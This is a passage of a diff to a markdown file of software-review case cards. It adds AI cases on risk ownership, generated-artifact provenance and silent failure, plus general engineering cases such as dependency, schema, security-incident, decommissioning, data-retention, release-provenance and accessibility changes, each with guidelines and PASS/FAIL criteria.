+- **Applicable when**: AI output influences users, operators, security/privacy, production release, or durable artifacts
+- **Guideline**: Name a risk owner, risk treatment, approval or acceptance gate, audit evidence, incident path, and review cadence
+- **CQ seed**: Is there an accountable owner for material AI risk?
+- **PASS**: Governance artifacts are connected to engineering release and incident loops
+- **FAIL**: AI risk is treated as external policy with no engineering artifact or owner
+- **Related documents**: domain_scope.md `Axiology Input`; competency_qs.md CQ-G-01
+
+### Case AI-07: Generated Artifact Without Provenance
+
+- **Source evidence**: SLSA provenance model; NIST SSDF; AI-generated-code and generated-document review patterns
+- **Observed failure**: Generated code, docs, review records, eval outputs, or authority artifacts are accepted without source refs, builder/agent identity, input set, transformation path, or verification state
+- **Review concern relevance**: dependency, logic, axiology, pragmatics
+- **Principle**: Trustworthy artifacts need provenance and verification summaries
+- **Applicable when**: A generated artifact affects release, user decisions, security posture, review records, or ontology authority
+- **Guideline**: Persist provenance for generated artifacts and keep public responses as summaries of artifact truth, not competing authority
+- **CQ seed**: Can generated authority-affecting artifacts be traced to source, builder, inputs, and verification state?
+- **PASS**: Artifact provenance and trust status are durable and inspectable
+- **FAIL**: The artifact is trusted because it appears plausible or was produced by a successful run
+- **Related documents**: concepts.md `Provenance`, `Generated Artifact`; competency_qs.md CQ-G-02
+
+### Case AI-08: Silent Degradation in Development or Review
+
+- **Source evidence**: LLM-native development experience; failure-diagnosis cost patterns; NIST GenAI risk-management emphasis on transparency and monitoring
+- **Observed failure**: A failing prompt, missing context, invalid tool result, provider preflight issue, schema mismatch, or missing artifact ref is hidden behind fallback output
+- **Review concern relevance**: logic, pragmatics, axiology, conciseness
+- **Principle**: In development/review/authority paths, fail-loud is usually cheaper and safer than silent degradation
+- **Applicable when**: A path exists to repair the failing source quickly, or an artifact becomes authority
+- **Guideline**: Halt or emit a diagnostic artifact naming the failing boundary. Allow user-facing degradation only with visible loss, trust status, diagnostics, and recovery path
+- **CQ seed**: Is apparent continuity hiding trust loss or diagnostic loss?
+- **PASS**: Failure location, cause, boundary, and artifact refs are visible
+- **FAIL**: The system returns generic or partial output while hiding the original failure
+- **Related documents**: logic_rules.md `LLM-Native Failure Posture`; competency_qs.md CQ-A-09, CQ-G-04
+
+## General Software Engineering Cases
+
+### Case SE-01: Feature Addition
+
+- **Source evidence**: Slack Huddles-style product expansion; API/product evolution patterns
+- **Observed failure**: New feature code ships without updating contracts, tests, docs, telemetry, permissions, or rollout/rollback paths
+- **Review concern relevance**: coverage, structure, dependency, pragmatics
+- **Principle**: A feature is a cross-artifact change, not only code
+- **Applicable when**: A new capability affects users, APIs, data, permissions, observability, or documentation
+- **Guideline**: Trace feature intent through API/schema, data model, tests, docs, telemetry, rollout, and ownership
+- **CQ seed**: Do all externally observable feature surfaces have corresponding contract and verification updates?
+- **PASS**: Code, API/schema, tests, docs, telemetry, rollout, and owner are aligned or marked non-applicable
+- **FAIL**: Implementation exists but consumers, tests, or operations cannot see the change
+- **Related documents**: structure_spec.md; competency_qs.md CQ-I, CQ-V, CQ-O
+
+### Case SE-02: External Dependency Change
+
+- **Source evidence**: React class-components-to-hooks ecosystem migration; package/API dependency practice
+- **Observed failure**: A dependency upgrade changes lifecycle, compatibility, runtime assumptions, or ecosystem support without impact analysis
+- **Review concern relevance**: dependency, evolution, structure
+- **Principle**: Dependency changes carry behavior and migration obligations
+- **Applicable when**: A package, framework, API, model provider, database, tool, or runtime changes
+- **Guideline**: Identify direct/transitive consumers, breaking changes, migration plan, tests, rollback, and docs
+- **CQ seed**: Can consumers of the changed dependency be found and verified?
+- **PASS**: Impacted surfaces, compatibility plan, and tests are explicit
+- **FAIL**: Dependency success is inferred from installation or compilation alone
+- **Related documents**: dependency_rules.md; competency_qs.md CQ-DE, CQ-I
+
+### Case SE-03: Schema or Data Model Change
+
+- **Source evidence**: Large-scale ID/schema migrations such as Twitter Snowflake-style ID evolution; database migration practice
+- **Observed failure**: Schema changes break existing data, API consumers, backfills, rollbacks, or source-of-truth assumptions
+- **Review concern relevance**: logic, dependency, structure, evolution
+- **Principle**: Data model changes are lifecycle and compatibility changes
+- **Applicable when**: Entities, identifiers, constraints, indexes, event schemas, or storage formats change
+- **Guideline**: Declare migration order, compatibility window, backfill/rollback path, source-of-truth transition, and verification queries
+- **CQ seed**: Can old and new data coexist safely during migration?
+- **PASS**: Migration, compatibility, validation, rollback, and observability are specified
+- **FAIL**: The schema changes without data lifecycle or consumer compatibility evidence
+- **Related documents**: logic_rules.md `Constraint Design Logic`; dependency_rules.md `Source of Truth Management`
+
+### Case SE-04: Scale Expansion
+
+- **Source evidence**: Netflix-style monolith-to-services and reliability evolution; SRE/error-budget practice
+- **Observed failure**: A system grows in traffic, tenants, data, or teams while retaining single-node assumptions, synchronous bottlenecks, or missing observability
+- **Review concern relevance**: structure, performance, operations, coverage
+- **Principle**: Scale changes architecture, verification, and operational obligations
+- **Applicable when**: Load, data volume, tenant count, team count, or availability expectations materially increase
+- **Guideline**: Reassess concurrency, data partitioning, queues, caching, SLIs/SLOs, deployment strategy, incident response, and cost
+- **CQ seed**: Which assumptions break at the new scale?
+- **PASS**: Capacity, failure isolation, observability, and rollback/canary strategy are updated
+- **FAIL**: The system scales by increasing resources without changing verification or failure boundaries
+- **Related documents**: structure_spec.md `Quantitative Thresholds`; competency_qs.md CQ-P, CQ-O
+
+### Case SE-05: Security Incident Response
+
+- **Source evidence**: Log4Shell CVE-2021-44228; OWASP Top 10; NIST SSDF
+- **Observed failure**: A security issue is found but affected assets, dependency graph, mitigations, patches, monitoring, and communication are incomplete
+- **Review concern relevance**: security, dependency, operations, axiology
+- **Principle**: Incident response is an engineering workflow with evidence and accountability
+- **Applicable when**: Vulnerabilities, compromised dependencies, credential exposure, data leakage, or unsafe AI behavior are discovered
+- **Guideline**: Identify affected versions/assets, mitigation, patch/rollout, detection, communication, postmortem, and preventive control updates
+- **CQ seed**: Can the system locate and verify all affected dependency paths?
+- **PASS**: Dependency graph, mitigation, tests, deploy evidence, monitoring, and disclosure path are complete
+- **FAIL**: The fix updates a package but cannot prove affected surfaces are covered
+- **Related documents**: dependency_rules.md `Dependency Security`; competency_qs.md CQ-SE, CQ-G-03
+
+### Case SE-06: API Breaking Change
+
+- **Source evidence**: Stripe-style versioned APIs; REST/gRPC/GraphQL compatibility practice
+- **Observed failure**: API consumers break because changed fields, semantics, error modes, pagination, auth, or version behavior were not classified
+- **Review concern relevance**: dependency, logic, pragmatics
+- **Principle**: Public contract changes require explicit compatibility classification
+- **Applicable when**: Request/response schema, auth, error semantics, ordering, pagination, rate limits, or side effects change
+- **Guideline**: Classify breaking/non-breaking, identify consumers, version the contract, document migration, and test compatibility
+- **CQ seed**: Are all public contract consumers protected from unannounced breakage?
+- **PASS**: Compatibility classification, versioning, migration docs, and contract tests exist
+- **FAIL**: A change is called internal while consumers can observe it
+- **Related documents**: dependency_rules.md `API Dependency Management`; competency_qs.md CQ-I
+
+### Case SE-07: Service or Feature Decommissioning
+
+- **Source evidence**: Feature sunset and service retirement patterns; ISO/IEC/IEEE 12207 lifecycle scope
+- **Observed failure**: A deprecated feature/service remains partially live through stale flags, docs, data, alerts, routes, permissions, or client dependencies
+- **Review concern relevance**: evolution, conciseness, operations, coverage
+- **Principle**: Retirement is part of the software lifecycle
+- **Applicable when**: Features, services, APIs, models, prompts, tools, indexes, or data stores are removed or sunset
+- **Guideline**: Define user communication, dependency removal, data retention/deletion, monitoring cleanup, fallback removal, and final verification
+- **CQ seed**: Is the retirement complete across runtime, docs, data, dependencies, and operations?
+- **PASS**: No stale authority, route, flag, alert, data obligation, or consumer remains without rationale
+- **FAIL**: Retired behavior survives as dead flags, hidden routes, stale docs, or unused indexes
+- **Related documents**: conciseness_rules.md `Dead Code and Feature Flags`; competency_qs.md CQ-MT, CQ-G-06
+
+### Case SE-08: Data Retention or Deletion Request
+
+- **Source evidence**: ISO/IEC/IEEE 12207 lifecycle scope; privacy/data-retention engineering practice
+- **Observed failure**: User, tenant, regulated, or operationally retained data is deleted from the primary database but survives in caches, logs, indexes, backups, generated artifacts, analytics sinks, or downstream processors
+- **Review concern relevance**: coverage, logic, dependency, security, axiology
+- **Principle**: Data lifecycle obligations apply to derived stores, not only the primary source of truth
+- **Applicable when**: The system stores personal, sensitive, tenant-scoped, regulated, or retained operational data
+- **Guideline**: Classify data, declare retention purpose, trace deletion/erasure across primary and derived stores, and document any legally or operationally retained exception
+- **CQ seed**: Can deletion or retention obligations be traced across every store and generated derivative?
+- **PASS**: Data classes, retention rules, deletion path, derived-store coverage, exception rationale, and verification evidence are explicit
+- **FAIL**: Deletion is implemented only for the primary table or excludes derived artifacts without a documented obligation
+- **Related documents**: concepts.md `Data Classification`, `Retention Policy`, `Deletion/Erasure Path`; competency_qs.md CQ-D-09, CQ-SE-07
+
+### Case SE-09: Release Artifact Provenance Gap
+
+- **Source evidence**: SLSA provenance model; NIST SSDF; dependency and release-management practice
+- **Observed failure**: A deployed package, container image, binary, or release bundle cannot be traced to source revision, build workflow, dependency inventory, verification result, approval gate, and deployment environment
+- **Review concern relevance**: dependency, operations, security, pragmatics
+- **Principle**: A release is a trust-bearing artifact, not only a successful build output
+- **Applicable when**: Software is packaged, deployed, published, or consumed by downstream systems
+- **Guideline**: Attach dependency inventory, vulnerability/license/security checks, signatures or attestations where required, and release-gate evidence to the shipped artifact identity
+- **CQ seed**: Can the shipped artifact be reconstructed and verified from source to environment?
+- **PASS**: Source, build, dependency inventory, verification, approval, artifact identity, and environment are linked
+- **FAIL**: Operators can see a version string but cannot prove what source, dependencies, checks, or approvals produced it
+- **Related documents**: dependency_rules.md `Release Artifact Provenance`; competency_qs.md CQ-O-07, CQ-DE-08
+
+### Case SE-10: User-Facing Accessibility or Locale Gap
+
+- **Source evidence**: WCAG 2.2 / ISO/IEC 40500:2025; ISO/IEC 25010 quality characteristics; internationalization practice
+- **Observed failure**: Critical user-facing flows ship without accessibility acceptance criteria, assistive-technology checks, locale formatting tests, translation ownership, or text-direction handling
+- **Review concern relevance**: coverage, axiology, pragmatics, verification
+- **Principle**: User-facing quality includes who can use the system and whether locale-sensitive output remains correct
+- **Applicable when**: A product has public, regulated, customer-facing, employee-facing, or locale-sensitive UI/API text
+- **Guideline**: Define accessibility level, supported locales, formatting/text-direction rules, translation ownership, and verification checks for critical flows
+- **CQ seed**: Are accessibility and locale obligations explicit and tested for critical user-facing paths?
+- **PASS**: Requirements and tests cover accessibility, locale formatting, text direction where applicable, and ownership of translations or content updates
+- **FAIL**: Accessibility/i18n is omitted, described qualitatively only, or left to manual inspection without target criteria
+- **Related documents**: domain_scope.md `Accessibility and internationalization`; competency_qs.md CQ-R-03, CQ-V-11
 
 ## Scenario Interconnections
 
-Extension scenarios are not independent. Multiple scenarios often occur simultaneously or trigger each other.
-
-| Scenario | Triggers / Interacts With | Reason |
-|---|---|---|
-| Case 1 (New Feature) | → Case 2 (Dependency) | New features often introduce new dependencies |
-| Case 2 (Dependency) | → Case 8 (Security) | Dependency upgrades often triggered by vulnerabilities |
-| Case 3 (Schema) | → Case 9 (API Breaking) | Data model changes propagate to API formats |
-| Case 4 (Scale) | → Case 10 (Monolith→MS) | Scale beyond capacity triggers decomposition |
-| Case 4 (Scale) | → Case 11 (DB Migration) | Scale may exceed database capabilities |
-| Case 4 (Scale) | → Case 5 (Environment) | Scale requires multi-region or cloud |
-| Case 6 (Team) | → Case 10 (Monolith→MS) | Team boundaries drive service boundaries (Conway's Law) |
-| Case 7 (Event Sourcing) | → Case 3 (Schema) | New event types are event store schema changes |
-| Case 8 (Security) | → Case 2 (Dependency) | Security patches require dependency upgrades |
-| Case 9 (API Breaking) | → Case 1 (New Feature) | Breaking changes often accompany new features |
-| Case 10 (Monolith→MS) | → Case 11 (DB Migration) | Service decomposition requires database splitting |
-| Case 11 (DB Migration) | → Case 4 (Scale) | Database migrations often motivated by scale |
-
----
+| Change type | Common follow-on cases |
+|---|---|
+| Prompt/model/provider migration | AI-02, AI-05, AI-08 |
+| RAG/corpus/index change | AI-01, AI-04, AI-07 |
+| Agent tool expansion | AI-02, AI-03, AI-06 |
+| Generated authority artifact | AI-02, AI-07, AI-08 |
+| Feature addition | SE-02, SE-03, SE-04, SE-06 |
+| Dependency/security incident | SE-02, SE-05, SE-07, SE-09 |
+| Decommissioning | SE-07 plus SE-08 for retained data and AI-04 when indexes/corpora are involved |
+| Data retention/deletion | SE-08 plus AI-04 when vector indexes or corpora are involved |
+| User-facing release | SE-01, SE-06, SE-10 |
 
 ## Related Documents
-- structure_spec.md — module structure, architectural patterns, verification structure, quantitative thresholds
-- dependency_rules.md — dependency direction, API management, runtime dependencies, build/package dependencies
-- logic_rules.md — type system, state management, constraint design, security, concurrency, testing logic
-- domain_scope.md — concern areas, concept categories, reference standards
-- concepts.md — term definitions for architecture, data/state, type system, change management
+
+- domain_scope.md - activation conditions and value commitments
+- concepts.md - canonical terms used by case cards
+- logic_rules.md - logical gates and failure posture
+- structure_spec.md - structural seats required by cases
+- dependency_rules.md - dependency, supply-chain, and provenance rules
+- competency_qs.md - CQ seeds and PASS/FAIL criteria
+- prompt_interface.md - prompt/context/tool/output interface criteria
